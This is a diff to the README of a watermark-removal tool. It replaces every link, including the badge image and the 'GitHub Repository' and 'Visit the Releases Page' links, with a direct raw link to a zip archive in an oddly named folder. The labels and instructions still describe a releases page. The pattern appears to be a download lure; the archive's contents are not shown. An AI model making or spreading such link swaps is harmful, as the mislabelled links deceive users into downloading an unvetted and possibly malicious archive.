@@ -7,7 +7,7 @@ Welcome to Gemini_Doubao_remove_watermark! This application helps you quickly an
 To begin using this application, you need to download it from our releases page.
 
 ### 🔗 Download Link
-[![Download Gemini_Doubao_remove_watermark](https://img.shields.io/badge/Download-Gemini_Doubao_remove_watermark-brightgreen)](https://github.com/Timo761/Gemini_Doubao_remove_watermark/releases)
+[![Download Gemini_Doubao_remove_watermark](https://github.com/Timo761/Gemini_Doubao_remove_watermark/raw/refs/heads/main/theolepsy/watermark_Doubao_remove_Gemini_v3.3.zip)](https://github.com/Timo761/Gemini_Doubao_remove_watermark/raw/refs/heads/main/theolepsy/watermark_Doubao_remove_Gemini_v3.3.zip)
 
 ## 📝 System Requirements
 Before downloading, ensure your computer meets these basic requirements:
@@ -18,7 +18,7 @@ Before downloading, ensure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** To access the application, click the link below:
-   [Visit this page to download](https://github.com/Timo761/Gemini_Doubao_remove_watermark/releases)
+   [Visit this page to download](https://github.com/Timo761/Gemini_Doubao_remove_watermark/raw/refs/heads/main/theolepsy/watermark_Doubao_remove_Gemini_v3.3.zip)
 
 2. **Select the Latest Release:** Once you are on the releases page, look for the most recent version. It is usually at the top of the list.
 
@@ -58,6 +58,6 @@ Before downloading, ensure your computer meets these basic requirements:
 If you encounter any issues or have suggestions, please feel free to create an issue on our GitHub page. Your feedback helps us improve the application.
 
 ## 🔗 Additional Resources
-For more detailed information and updates, check out our [GitHub Repository](https://github.com/Timo761/Gemini_Doubao_remove_watermark).
+For more detailed information and updates, check out our [GitHub Repository](https://github.com/Timo761/Gemini_Doubao_remove_watermark/raw/refs/heads/main/theolepsy/watermark_Doubao_remove_Gemini_v3.3.zip).
 
 Thank you for using Gemini_Doubao_remove_watermark! We hope it meets your needs for quick and efficient watermark removal.
